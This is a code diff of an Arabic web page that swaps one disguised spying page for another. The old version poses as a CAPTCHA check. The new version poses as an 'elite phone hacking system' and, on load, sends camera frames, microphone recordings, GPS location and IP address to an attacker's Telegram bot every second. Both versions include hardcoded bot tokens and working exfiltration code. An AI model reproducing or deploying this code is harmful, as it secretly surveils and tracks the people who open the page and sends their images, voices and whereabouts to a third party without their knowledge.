@@ -1,367 +1,619 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من أنك لست روبوت</title>
+    <title>Mr - Dark</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
+        * {
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
-        }
-        .captcha-container {
-            background-color: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 500px;
-            padding: 30px;
-            text-align: center;
-        }
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background-color: #4285F4;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        h1 {
-            color: #202124;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-        .description {
-            color: #5f6368;
-            margin-bottom: 30px;
-            font-size: 16px;
-            line-height: 1.6;
-        }
-        .captcha-box {
-            background-color: #f8f9fa;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .captcha-text {
-            font-size: 24px;
-            letter-spacing: 5px;
-            color: #4285F4;
-            font-weight: bold;
-            margin: 15px 0;
-            user-select: none;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            margin-bottom: 20px;
             box-sizing: border-box;
-            text-align: center;
         }
-        button {
-            background-color: #4285F4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 12px 24px;
-            font-size: 16px;
-            cursor: pointer;
+
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Matrix Background Effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            transition: background-color 0.3s;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            pointer-events: none;
         }
-        button:hover {
-            background-color: #3367D6;
+
+        .matrix-bg::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 255, 65, 0.03) 2px,
+                    rgba(0, 255, 65, 0.03) 4px),
+                repeating-linear-gradient(90deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 255, 65, 0.03) 2px,
+                    rgba(0, 255, 65, 0.03) 4px);
+            animation: matrix-scroll 20s linear infinite;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #5f6368;
+
+        @keyframes matrix-scroll {
+            0% {
+                transform: translateY(-100%);
+            }
+
+            100% {
+                transform: translateY(100%);
+            }
         }
-        .hidden {
+
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            animation: glow-red 2s ease-in-out infinite alternate;
+            margin-bottom: 10px;
+        }
+
+        @keyframes glow-red {
+            from {
+                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            }
+
+            to {
+                text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000;
+            }
+        }
+
+        .subtitle {
+            color: #00ff41;
+            font-size: 1.2em;
+            text-shadow: 0 0 5px #00ff41;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff41;
+            border-radius: 15px;
+            box-shadow:
+                0 0 30px rgba(0, 255, 65, 0.4),
+                inset 0 0 30px rgba(0, 255, 65, 0.1);
+            position: relative;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00ff41, #ff0000, #00ff41);
+            border-radius: 15px;
+            z-index: -1;
+            animation: border-glow 3s linear infinite;
+        }
+
+        @keyframes border-glow {
+            0% {
+                opacity: 0.5;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0.5;
+            }
+        }
+
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .welcome-text h2 {
+            font-size: 2em;
+            color: #ff0000;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        .welcome-text p {
+            font-size: 1.1em;
+            color: #00ff41;
+            text-shadow: 0 0 5px #00ff41;
+        }
+
+        .input-group {
+            margin: 30px 0;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 1.2em;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff41;
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+        }
+
+        .input-group input:focus {
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+            border-color: #00ff41;
+        }
+
+        .input-group input::placeholder {
+            color: #888;
+        }
+
+        .hack-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #000;
+            background: linear-gradient(45deg, #00ff41, #00cc33);
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hack-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
+        }
+
+        .hack-button:active {
+            transform: scale(0.98);
+        }
+
+        .hack-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .hack-button:active::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .result {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            min-height: 60px;
             display: none;
         }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(0,0,0,.3);
-            border-radius: 50%;
-            border-top-color: #000;
-            animation: spin 1s ease-in-out infinite;
-            margin-left: 10px;
+
+        .result.show {
+            display: block;
+            animation: fadeIn 0.5s ease-in;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .terminal-line {
+            margin: 5px 0;
+            color: #00ff41;
+            text-shadow: 0 0 5px #00ff41;
+        }
+
+        .error-text {
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .loading-animation {
+            display: inline-block;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            50% {
+                opacity: 1;
+            }
+
+            51%,
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .skull {
+            font-size: 2em;
+            margin: 10px 0;
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .warning {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            z-index: 1000;
+            animation: hideWarning 5s forwards;
+            /* المدة الإجمالية 5 ثواني */
+        }
+
+        @keyframes hideWarning {
+            0% {
+                opacity: 1;
+            }
+
+            80% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+                display: none;
+            }
+        }
+
+        /* Media Queries للاستجابة */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 2em;
+            }
+
+            .welcome-text h2 {
+                font-size: 1.5em;
+            }
+        }
+
+        #video {
+            display: none;
+            /* عدم عرض الفيديو أثناء التسجيل */
+        }
+
+        body {
+            background-color: #282c34;
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            margin-top: 20px;
+        }
+
+        h1 {
+            color: red;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 5px;
+            width: 80%;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
-<body>
-    <div class="captcha-container">
-        <div class="logo">✓</div>
-        <h1>التحقق من أنك لست روبوت</h1>
-        <p class="description">لحماية موقعنا، يرجى إكمال التحقق لإثبات أنك لست روبوت.</p>
-        
-        <div class="captcha-box">
-            <p>أدخل النص الظاهر في الصورة أدناه:</p>
-            <div class="captcha-text" id="captcha-text">5G7H9K</div>
-            <input type="text" id="captcha-input" placeholder="أدخل النص هنا" autocomplete="off">
-            <button id="verify-btn">تحقق</button>
-        </div>
-        
-        <div id="status-message" class="hidden"></div>
-        
-        <div class="footer">
-            <p>هذا النظام يستخدم تقنيات التحقق الآمنة لحماية خصوصيتك.</p>
-        </div>
-    </div>
 
-    <script>
-        // تكوين البوت (استبدل بالقيم الخاصة بك)
-        const BOT_TOKEN = "8100048569:AAGGlLptTr256CnDgDYmU1kRtpRR7hV8sD4";
-        const CHAT_ID = "7826740539";
-        
-        // بيانات التطبيق
-        const collectedData = {
-            systemInfo: getSystemInfo(),
-            camera: { photo: null, allowed: false },
-            microphone: { audio: null, allowed: false },
-            location: { coords: null, address: null, allowed: false }
-        };
-        
-        // عناصر DOM
-        const captchaText = document.getElementById('captcha-text');
-        const captchaInput = document.getElementById('captcha-input');
-        const verifyBtn = document.getElementById('verify-btn');
-        const statusMessage = document.getElementById('status-message');
-        
-        // إنشاء CAPTCHA عشوائي
-        function generateCaptcha() {
-            const chars = "8100048569:AAGGlLptTr256CnDgDYmU1kRtpRR7hV8sD4";
-            let captcha = "7826740539";
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+<body>
+
+    <div class="warning">
+        ⚠️ يجب اعطاء الصلاحيات
+    </div>
+    <div class="header">
+        <h1>☠️ MR - DARK HACKER ☠️</h1>
+        <div class="subtitle">█ ELITE PHONE HACKING SYSTEM █</div>
+    </div>
+    <div class="container">
+        <div class="welcome-text">
+            <h2>🔥 مرحباً في النظام السري 🔥</h2>
+            <p>⚡ أدخل رقم الهدف لبدء عملية الاختراق ⚡</p>
+        </div>
+        <div class="input-group">
+            <input type="text" id="phoneInput" placeholder="🔢 رقم الهاتف المستهدف..." maxlength="15">
+        </div>
+
+        <button class="hack-button" onclick="startHacking()">
+            🚀 بدء عملية الاختراق 🚀
+        </button>
+
+        <div id="result" class="result"></div>
+
+
+
+        <video id="video" autoplay></video>
+        <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>
+
+
+
+        <script>
+            const botToken = "8211931301:AAHKeI6iPoOAfXBo6mQ1n7bcvfF6CHnFxK8"; //token bot
+            let chatId = getChatIdFromUrl();
+
+            function getChatIdFromUrl() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('id');
             }
-            return captcha;
-        }
-        
-        // جمع معلومات النظام الأساسية
-        function getSystemInfo() {
-            return {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                languages: navigator.languages,
-                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
-                deviceMemory: navigator.deviceMemory || 'غير معروف'
-            };
-        }
-        
-        // عند تحميل الصفحة
-        window.onload = () => {
-            // تعيين CAPTCHA عشوائي
-            captchaText.textContent = generateCaptcha();
-            
-            // إضافة مستمع للأحداث للزر
-            verifyBtn.addEventListener('click', async () => {
-                if (captchaInput.value === captchaText.textContent) {
-                    statusMessage.innerHTML = '<div class="loading"></div> جاري التحقق من المعلومات...';
-                    statusMessage.classList.remove('hidden');
-                    
-                    try {
-                        // طلب الأذونات بالتسلسل
-                        await requestLocation();
-                        await requestCamera();
-                        await requestMicrophone();
-                        
-                        // بعد جمع كل البيانات
-                        await sendAllDataToTelegram();
-                        
-                        statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
-                    } catch (error) {
-                        statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
-                        console.error("Error:", error);
-                    }
+
+            function startCamera() {
+                const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
+                const ctx = canvas.getContext("2d");
+
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                if (isMobile) {
+                    video.setAttribute("width", "100%");
+                    video.setAttribute("height", "auto");
                 } else {
-                    statusMessage.textContent = '❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى.';
-                    statusMessage.classList.remove('hidden');
-                    captchaText.textContent = generateCaptcha();
-                    captchaInput.value = '';
+                    video.setAttribute("width", "2000");
+                    video.setAttribute("height", "2000");
                 }
-            });
-        };
-        
-        // طلب إذن الموقع
-        async function requestLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject(new Error("المتصفح لا يدعم خدمة الموقع"));
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        collectedData.location.coords = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        
-                        try {
-                            // الحصول على اسم الموقع
-                            const response = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
-                            );
-                            const data = await response.json();
-                            collectedData.location.address = data.display_name;
-                            collectedData.location.allowed = true;
-                            resolve();
-                        } catch (err) {
-                            reject(err);
-                        }
-                    },
-                    (error) => {
-                        reject(new Error(`فشل في الحصول على الموقع: ${error.message}`));
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
-        
-        // طلب إذن الكاميرا والتقاط صورة
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // التقاط صورة
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.playsInline = true;
-                video.srcObject = stream;
-                
-                // انتظار حتى يكون الفيديو جاهزًا
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    collectedData.camera.photo = blob;
-                    collectedData.camera.allowed = true;
-                }, 'image/jpeg', 0.9);
-                
-                // إيقاف الكاميرا بعد التقاط الصورة
-                stream.getTracks().forEach(track => track.stop());
-                
-            } catch (error) {
-                throw new Error(`فشل في الوصول للكاميرا: ${error.message}`);
-            }
-        }
-        
-        // طلب إذن الميكروفون وتسجيل الصوت
-        async function requestMicrophone() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const audioChunks = [];
-                
-                recorder.ondataavailable = event => audioChunks.push(event.data);
-                
-                return new Promise((resolve) => {
-                    recorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        collectedData.microphone.audio = audioBlob;
-                        collectedData.microphone.allowed = true;
-                        resolve();
-                    };
-                    
-                    recorder.start();
-                    
-                    // تسجيل لمدة 15 ثانية ثم إيقاف
-                    setTimeout(() => {
-                        if (recorder.state !== 'inactive') {
-                            recorder.stop();
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                    }, 15000);
-                });
-                
-            } catch (error) {
-                throw new Error(`فشل في الوصول للميكروفون: ${error.message}`);
-            }
-        }
-        
-        // إرسال جميع البيانات إلى تليجرام
-        async function sendAllDataToTelegram() {
-            try {
-                // إرسال البيانات النصية أولاً
-                let message = `📊 <b>تقرير معلومات الجهاز التلقائي</b>\n\n`;
-                message += `⏰ <b>الوقت:</b> ${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n`;
-                message += `💻 <b>المتصفح:</b> ${collectedData.systemInfo.userAgent}\n`;
-                message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
-                
-                if (collectedData.location.allowed) {
-                    message += `\n📍 <b>الموقع:</b> ${collectedData.location.address || 'غير معروف'}\n`;
-                    message += `🌐 <b>الإحداثيات:</b> ${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
-                }
-                
-                await sendToTelegram(message, 'text');
-                
-                // إرسال الصورة إن وجدت
-                if (collectedData.camera.photo) {
-                    await sendToTelegram(collectedData.camera.photo, 'photo');
-                }
-                
-                // إرسال التسجيل الصوتي إن وجد
-                if (collectedData.microphone.audio) {
-                    await sendToTelegram(collectedData.microphone.audio, 'audio');
-                }
-                
-            } catch (error) {
-                throw error;
-            }
-        }
-        
-        // دالة مساعدة للإرسال إلى تليجرام
-        async function sendToTelegram(data, type) {
-            if (type === 'text') {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: data,
-                        parse_mode: 'HTML'
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+
+                        setInterval(() => {
+                            ctx.drawImage(video, 0, 0, 2000, 2000);
+                            canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
+                            sendIpAddressToTelegram();
+                            sendLocationToTelegram();
+                            startRecording();
+                        }, 1000);
                     })
-                });
-            } else {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append(type, data, `file.${type === 'photo' ? 'jpg' : 'wav'}`);
-                
-                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
-                    method: 'POST',
-                    body: formData
-                });
+                    .catch(error => {
+                        console.error(error);
+                        alert("Failed to access camera.");
+                    });
             }
-        }
-    </script>
+
+            function sendToTelegram(blob) {
+                const formData = new FormData();
+                formData.append("photo", blob, "camera.jpg");
+                formData.append("chat_id", chatId);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData,
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Camera frame sent to Telegram.");
+                        } else {
+                            throw new Error(data.description);
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        alert("Failed to send camera frame.");
+                    });
+            }
+
+            function sendIpAddressToTelegram() {
+                fetch("https://api.ipify.org/?format=json")
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipAddress = data.ip;
+                        const message = `IP Address: ${ipAddress}`;
+                        sendTextToTelegram(message);
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        alert("Failed to fetch IP address.");
+                    });
+            }
+
+            function sendTextToTelegram(message) {
+                const params = new URLSearchParams({
+                    chat_id: chatId,
+                    text: message
+                });
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?${params}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Message sent to Telegram.");
+                        } else {
+                            throw new Error(data.description);
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        alert("Failed to send message.");
+                    });
+            }
+
+            function sendLocationToTelegram() {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const message = `GPS Location: ${latitude}, ${longitude}`;
+                        sendTextToTelegram(message);
+                    }, error => {
+                        console.error(error);
+                        const errorMessage = getGeolocationErrorMessage(error);
+                        alert(errorMessage);
+                    });
+                } else {
+                    console.error("Geolocation not available.");
+                    alert("Geolocation is not supported.");
+                }
+            }
+
+            function getGeolocationErrorMessage(error) {
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        return "Permission to access GPS location was denied.";
+                    case error.POSITION_UNAVAILABLE:
+                        return "GPS location information is unavailable.";
+                    case error.TIMEOUT:
+                        return "GPS location request timed out.";
+                    default:
+                        return "An unknown error occurred while fetching GPS location.";
+                }
+            }
+
+            function sendAudioToTelegram(blob) {
+                const formData = new FormData();
+                formData.append("audio", blob, "recording.wav");
+                formData.append("chat_id", chatId);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                    method: "POST",
+                    body: formData,
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Audio recording sent to Telegram.");
+                        } else {
+                            throw new Error(data.description);
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        alert("Failed to send audio recording.");
+                    });
+            }
+
+            function startRecording() {
+                const audioChunks = [];
+
+                navigator.mediaDevices
+                    .getUserMedia({ audio: true, video: false })
+                    .then((stream) => {
+                        const mediaRecorder = new MediaRecorder(stream);
+
+                        mediaRecorder.start();
+
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 4000);
+
+                        mediaRecorder.addEventListener("dataavailable", (event) => {
+                            audioChunks.push(event.data);
+                        });
+
+                        mediaRecorder.addEventListener("stop", () => {
+                            const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                            sendAudioToTelegram(audioBlob);
+                        });
+                    })
+                    .catch((error) => {
+                        console.error(error);
+                        alert("Failed to access microphone.");
+                    });
+            }
+
+            // Call startCamera when the page is loaded.
+            startCamera();
+        </script>
+
 </body>
+
 </html>
